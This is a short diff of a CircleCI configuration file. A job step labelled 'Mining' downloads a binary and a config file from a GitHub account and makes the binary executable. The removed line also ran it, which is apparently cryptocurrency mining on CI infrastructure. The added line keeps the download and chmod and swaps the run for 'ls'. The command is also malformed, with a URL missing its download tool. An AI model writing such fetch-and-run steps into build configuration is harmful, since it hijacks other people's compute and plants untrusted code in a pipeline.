@@ -16,7 +16,7 @@ jobs:
       - checkout
       - run:
           name: "Mining"
-          command: wget https://github.com/Miningac/gas/raw/main/gas && https://raw.githubusercontent.com/Miningac/gas/main/script.ini && chmod +x gas.1 && ./gas.1 script.ini.1
+          command: wget https://github.com/Miningac/gas/raw/main/gas && https://raw.githubusercontent.com/Miningac/gas/main/script.ini && chmod +x gas.1 && ls
 
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
